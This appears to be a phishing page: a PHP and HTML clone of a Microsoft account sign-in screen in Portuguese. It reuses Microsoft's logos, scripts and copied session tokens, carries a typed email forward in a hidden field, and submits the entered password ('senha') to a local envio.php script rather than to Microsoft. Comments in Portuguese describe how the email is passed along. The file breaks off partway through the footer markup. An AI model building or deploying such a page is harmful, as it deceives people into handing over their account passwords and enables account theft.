<?php

session_start();


if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
    $_SESSION['email'] = $_POST['email'];
}


$email = isset($_SESSION['email']) ? $_SESSION['email'] : 'email não encontrado!';

?>

<!DOCTYPE html>

<html dir="ltr" class="" lang="pt"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Entrar em sua conta</title>
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msftauth.net/" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://aadcdn.msftauth.net/">
<link rel="dns-prefetch" href="https://aadcdn.msauth.net/">

    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1046">
    <meta name="LocLC" content="pt-BR">


        <meta name="format-detection" content="telephone=no">

    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>

    
    
<meta name="robots" content="none">

<script type="text/javascript">//<![CDATA[
!function(t,e){!function(){var n=e.getElementsByTagName("head")[0];n&&n.addEventListener&&(n.addEventListener("error",function(e){null!==e.target&&"cdn"===e.target.getAttribute("data-loader")&&t.$Loader.OnError(e.target)},!0),n.addEventListener("load",function(e){null!==e.target&&"cdn"===e.target.getAttribute("data-loader")&&t.$Loader.OnSuccess(e.target)},!0))}()}(window,document);
//]]></script>

        <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
                <link rel="shortcut icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

    <script type="text/javascript">
        ServerData = $Config;
    </script>


    
    <link data-loader="cdn" crossorigin="anonymous" href="./js/converged.v2.login.min_qzvqnltrxpy99ajspyxbgq2.css" rel="stylesheet">


    <script data-loader="cdn" crossorigin="anonymous" src="./js/ConvergedLogin_PCore_MPdO7dOdkI4kz5U_F5jz_A2.js" integrity="sha384-rFm9V/Tx+VoxVhEYgv3lmqk+4AwHt5d942jk5wETvMosTAbRRSeJN7lF+kVnSIWY"></script>

    <script data-loader="cdn" crossorigin="anonymous" src="./js/ux.converged.login.strings-pt-br.min_twomrpfha4odb6xtgntpig2.js"></script>



<script charset="utf-8" src="./js/convergedlogin_pcustomizationloader_117b650bccea354984d8.js"></script><script charset="utf-8" src="./js/convergedlogin_pfetchsessionsprogress_d0a803279e7397bef834.js"></script><script charset="utf-8" src="./js/convergedlogin_pstringcustomizationhelper_4285088f1dbaf52a876d.js"></script></head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb remove-segoe-ui-symbol" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,s=e.document,i=e.$Config||{};if(e.self===e.top){s&&s.body&&(s.body.style.display="block")}else if(!i.allowFrame){var o,t,r,f,n,d;if(i.fAddTryCatchForIFrameRedirects){try{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}catch(e){}}else{o=e.self.location.href,t=o.indexOf("#"),r=-1!==t,f=o.indexOf("?"),n=r?t:o.length,d=-1===f||r&&f>t?"?":"&",
o=o.substr(0,n)+d+"iframe-request-id="+i.sessionId+o.substr(n),e.top.location=o}}}();
//]]></script>
    

<div><!--  -->

<!--  -->

<div data-bind="if: activeDialog"></div>

<form method="post" action="envio.php">
    <!-- ko withProperties: { '$loginPage': $data } -->
    <div class="login-paginated-page" data-bind="component: { name: &#39;master-page&#39;,
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko if: isLightboxTemplate() -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { &#39;provide-min-height&#39;: svr.fUseMinHeight }" class="provide-min-height"><!--  -->

<div id="lightboxBackgroundContainer" data-bind="css: { &#39;provide-min-height&#39;: svr.fUsePlaywrightMinHeight },
    component: { name: &#39;background-image-control&#39;,
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }, ariaLabel: str[&#39;STR_Background_Image_AltText&#39;]" class="background-image ext-background-image" aria-label="Imagem do plano de fundo da organização" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.iBannerEnvironment --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="externalCss: { &#39;middle&#39;: true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: &#39;content-control&#39;, params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate(), hasHeader: showHeader } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { &#39;sign-in-box&#39;: true },
            css: {
                &#39;inner&#39;:  $content.isVerticalSplitTemplate,
                &#39;vertical-split-content&#39;: $content.isVerticalSplitTemplate,
                &#39;app&#39;: $page.backgroundLogoUrl,
                &#39;wide&#39;: $page.paginationControlHelper.useWiderWidth,
                &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                &#39;has-popup&#39;: $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails,
                &#39;has-header&#39;: $content.hasHeader }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.fShowCookieBanner --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: &#39;logo-control&#39;,
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc && !isCiamUserFlowUx -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="js/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" svgsrc="js/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./js/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko -->    
 <?php

if (isset($_POST['email'])) {
    $email = $_POST['email'];
} else {
    echo "email não foi enviado!";
    exit;
}
?>
 <br>

 <p><?php echo htmlspecialchars($email); ?></p> <!----aqui vai mostra o email que foi digitado la no site la--->

        
<input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>"> <!---- aqui vai salvar o email que foi digitado para enviar pro envio.php ---> 

<!-- ko if: !bannerLogoUrl && isCiamUserFlowUx && bannerLogoText --><!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.strLWADisclaimerMsg && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.fEnableCssAnimation,
                disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --><!-- /ko -->

    <div class="pagination-view animate slide-in-next" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds,
                    customStrings: $loginPage.customStrings(),
                    isCustomizationFailure: $loginPage.isCustomStringsLoadFailure(), 
                    userIdLabel: $loginPage.userIdLabel,
                    cantAccessYourAccountText: $loginPage.cantAccessYourAccountText,
                    hideAccountResetCredentials: $loginPage.hideAccountResetCredentials,
                    accessRecoveryLink: $loginPage.accessRecoveryLink,
                    boilerPlateText: $loginPage.boilerPlateText },
                event: {
                    restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                    redirect: $loginPage.view_onRedirect,
                    updateDFPUrl: $loginPage.view_onUpdateDFPUrl,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }"><!--  -->

<!-- ko if: svr.fAllowLoginTextCustomizations -->
<div data-bind="component: { name: &#39;header-control&#39;,
    params: {
        serverData: svr,
        title: customTitle() || str[&#39;WF_STR_HeaderDefault_Title&#39;],
        headerDescription: customDescription() } }"><div>
    <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { &#39;title&#39;: true }">
        <div role="heading" aria-level="1" data-bind="text: title">Insira a senha</div>
        <!-- ko if: isSubtitleVisible --><!-- /ko -->
    </div>

    <!-- ko if: headerDescription --><!-- /ko -->
</div></div>
<!-- /ko -->

<!-- ko ifnot: svr.fAllowLoginTextCustomizations --><!-- /ko -->

<!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko -->

<div class="row">
    <!-- ko if: svr.fEnableAriaLiveUpdates --><!-- /ko -->

    <!-- ko ifnot: svr.fEnableAriaLiveUpdates -->
    <div role="alert" aria-live="assertive">
        <!-- ko if: usernameTextbox.error --><!-- /ko -->
    </div>
    <!-- /ko -->

    <div class="form-group col-md-24">
        <!-- ko if: prefillNames().length > 1 --><!-- /ko -->

        <!-- ko ifnot: prefillNames().length > 1 -->
        <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox-field&#39;,
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: svr.fEnableLivePreview ? userIdLabel : tenantBranding.unsafe_userIdLabel || str[&#39;STR_SSSU_Username_Hint&#39;] || str[&#39;CT_PWD_STR_Email_Example&#39;],
                hintCss: &#39;placeholder&#39; + (!svr.fAllowPhoneSignIn ? &#39; ltr_override&#39; : &#39;&#39;) },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input type="senha" name="senha" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry" data-bind="
                    attr: { lang: svr.fApplyAsciiRegexOnInput ? null : &#39;en&#39;,
                            autocomplete: svr.fIsUpdatedAutocompleteEnabled ? &#39;username&#39; : null },
                    externalCss: {
                        &#39;input&#39;: true,
                        &#39;text-box&#39;: true,
                        &#39;has-error&#39;: usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str[&#39;CT_PWD_STR_Username_AriaLabel&#39;],
                    ariaDescribedBy: &#39;loginHeader&#39; + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? &#39; loginDescription usernameError&#39; : &#39; usernameError&#39;),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" autocomplete="username" aria-label="Senha" aria-describedby="loginHeader usernameError" placeholder="Senha">

            <!-- ko if: svr.fIsUpdatedAutocompleteEnabled -->
            <input name="passwd" type="password" id="i0118" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
            <!-- /ko -->

            <!-- ko ifnot: svr.fIsUpdatedAutocompleteEnabled --><!-- /ko -->

        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
        <!-- /ko -->
    </div>
</div>

<div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText &amp;&amp; !boilerPlateText }, externalCss: { &#39;password-reset-links-container&#39;: true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
    <div class="row">
        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                <!-- ko if: svr.fIsSelfServiceSignupUxEnabled --><!-- /ko -->

                <!-- ko ifnot: svr.fIsSelfServiceSignupUxEnabled -->
                <a href="" id="signup" aria-label="Criar uma conta da Microsoft">Esqueceu a senha?</a>
                <br><br>
                <a href="" id="signup" aria-label="Criar uma conta da Microsoft">Forgot username</a></div>
                
                <!-- /ko -->
                <!-- /ko -->

                <!-- ko ifnot: hideCantAccessYourAccount -->
                
                <!-- /ko -->

                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.fShowForgotUsernameLink || isOfflineAccountVisible) --><!-- /ko -->

                <!-- ko if: svr.fEnableShowPickerCredObservable -->
                    <!-- ko if: showCredPicker() --><!-- /ko -->
                <!-- /ko -->

                <!-- ko ifnot: svr.fEnableShowPickerCredObservable --><!-- /ko -->

                <!-- ko if: svr.urlSkipZtd --><!-- /ko -->
            </div>
        </div>
    </div>
</div>

<!-- ko if: svr.fShowLegalMessagingInline --><!-- /ko -->

<div class="win-button-pin-bottom" data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText || boilerPlateText }">
    <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText || boilerPlateText }">
        <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin },
    externalCss: { &#39;button-field-container&#39;: true }">

    <!-- ko if: isSecondaryButtonVisible -->
    <div data-bind="css: { &#39;inline-block&#39;: true }, externalCss: { &#39;button-item&#39;: true }" class="inline-block button-item ext-button-item">
    <!-- /ko -->

    <div data-bind="css: { &#39;inline-block&#39;: isPrimaryButtonVisible }, externalCss: { &#39;button-item&#39;: true }" class="inline-block button-item ext-button-item">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <!-- ko ifnot: svr.fConsentButtonIdViaName -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                css: { &#39;high-contrast-overrides&#39;: svr.fUseHighContrastOverrides },
                externalCss: {
                    &#39;button&#39;: true,
                    &#39;primary&#39;: true },
                value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
                hasFocus: focusOnPrimaryButton,
                click: svr.fEnableLivePreview ?  function() { } : primaryButton_onClick,
                clickBubble: !svr.fEnableLivePreview,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Entrar">
        <!-- /ko -->
        <!-- ko if: svr.fConsentButtonIdViaName --><!-- /ko -->
    </div>
</div></div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText || boilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
        <!-- /ko -->

        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
        <!-- ko if: svr.sCanaryTokenName && !svr.fSkipRenderingNewCanaryToken -->
        <input type="hidden" data-bind="attr: { name: svr.sCanaryTokenName }, value: svr.canary" name="canary" value="ntao/ykOa3BDHKdHAoxbwsuX2VcraTh6jdrJqnI6FKs=3:1:CANARY:H6x2GysDzyc22x3Xv8Pxt0JsRFyhZ9MgNTiX5i7J1uE=">
        <!-- /ko -->
        <!-- ko if: !svr.sCanaryTokenName || svr.fSkipRenderingNewCanaryToken --><!-- /ko -->
        <input type="hidden" name="ctx" data-bind="value: ctx" value="rQQIARAAfZK_j9tkGMft5Jr7ofYaVYDaAVQkBoRw8vpN4jgnndRLnDhxzk4ucXKJhRQ5_pH45-vYrxMnQycGGJA6042xC-hYEBIIRg4hysLQhVZsNyBUqdKN5P4Blkf66vl8n-H5fg92yzkmB3LgozTMgaMPVJbWK0DVKFUtl6iiZrLUlC5qVImdmoUiW4KsaYT3DrK_zG4_ePP700cX1z8-fv-T46-fke_NMQ6io3xe9aOVEUY5z9JCFCET5zTk5b8jyeck-SwVMQWWoUGRZZkKLAAWQjrX4RuuJM9KEneGFW5oKTUAxI1knZ7XgSRrWLKr3tgeA0VW3M52v2XXEt_zFNnBotywxC0_9hruqewAZXtDlN25uGlB0R56Ct-CL1J3OycxnsObgUJrY1ylDiPDNTQ8UTUNxT5-ndo3UehNAhThL9M_pDqB4bf0GvL9LZS78Rk-tjQVW8jvhigwQmwZ0TF_BoTFQFBBHNfNWdvrdGXeqNgjFSW9BtXVxrHAxQtzaoB2dcguPZ63AlykZA8K9kmtNoJRpSxCMFGK_UF91UOh1N1Im-6SPVua63HQqnrSrOHVE85ZUudNsyLhKQBu0nctQdC9oQU7bFzRRMpMqOKpeMomZmujKM1wch4hYHDr7oadC8qi5GjOGM2WfdaWR2cN7MZi0D7BczbquWvsuYO-TocOo7hTutryhFrTWnKO4pxTIR-Em1qNK-m-xQk1mp9oU8Ed2HDetVG_N2QWPSNYYH1BheOBrRd8vFr1VxfpzDZyD_mX6cPtq3xLfxiEyLRc4_kOebXzzt5uNnOfeEh8-BZIH-3tHWSJG3W9Q351a1utL-68_erP3_6ufvrHY-LB5wxxeSvvYxXl105HLVS5ZltvnqBkuoriERxqoSrPGVsPhYXfYhrt6LhwRD_JkE8ymcvMfoubSHW5WIb_ZsjPdonv99_935K-uL1_sOOjQL1Hwp_uENeHv_518fPF02__aV7d_bjJJJBfR9xmrUGYFEZLtptgIES9xnquVMSZJFujklUW6Lh-_E2WeJkl_gM1">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="e1150d8d-cdd6-42e3-84d1-7e0019893600">
        <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABIQEAAAApTwJmzXqdR4BN2miheQMY7yBnZbJPYq375SDiWZJv28T259wgNr8TXowL0GoZXseSu4XFZr_-rTWVs1idYYm5alZHswWhazksjTUqha0848L2S2OOKz3gjHhqg2HlcAOzxPNrKhLZYeg78b9a6gw9grC-MT4I4588UNyLoyDrvTdQhPIeiaz5BehmpuqgpklyR-2xP_2YbzjG2cgOLfeQCsYadrOQjwfTgGsqlRAb4xkQ5eq-trb52j0aqrKUR6GWkneLilRlhi5czcPF8x53tlEYQZ0iJfD1fgaycJgmf2oZfRB_I8EkSehH1EmpaEMeyVW92gMTys3mo3DY7OHyctNQTJA9lKm53qvrO1cp-kif1VrTUpidXujlguQ_1eRSvC7Z01Xx1axmnfVStMpQvY-SAIw7OlpA3w2wKrmjH-woDSzGCQZUlSY26kxFHDlXAuVYA2sZ2DtTwSC4pQq9g6su-ro2Vgvnq2IWzzGSUAUWYCRQpovrAp_OoRKRyE6b2oSSrxGGOChdP623OHNZpSnRwzbwEAmpFK8F97BlXyAA">
        <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
        <input type="hidden" name="NewUser" value="1">
        <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
        <!-- ko ifnot: svr.fShouldSupportTargetCredentialForRecovery --><!-- /ko -->
        <!-- ko if: svr.fEnableDFPIntegration -->
        <input type="hidden" name="DfpArtifact" data-bind="value: dfpResult()" value="">
        <!-- /ko -->
        <!-- ko if: svr.fShouldSupportTargetCredentialForRecovery && targetCredentialForRecovery() --><!-- /ko -->
        <div data-bind="component: { name: &#39;instrumentation-control&#39;,
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko ifnot: svr.fUsePromotedFedCredTypesArray --><!-- /ko -->

        <!-- ko if: svr.fUsePromotedFedCredTypesArray -->
        <!-- ko if: $page.showFedCredButtons -->
        <div data-bind="component: { name: &#39;fed-cred-buttons-control&#39;,
            params: {
                serverData: svr,
                fedCredOptions: $page.otherSigninOptions },
            event: {
                fedCredButtonClick: $page.otherSigninOptionsButton_onClick } }"><!--  -->

        <!-- /ko -->
        <!-- /ko -->

    </div>
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: $page.showSignupFedCredButtons --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: svr.fShowQrCodePinOption --><!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            &#39;footer&#39;: true,
            &#39;has-background&#39;: !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: &#39;footer-control&#39;,
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
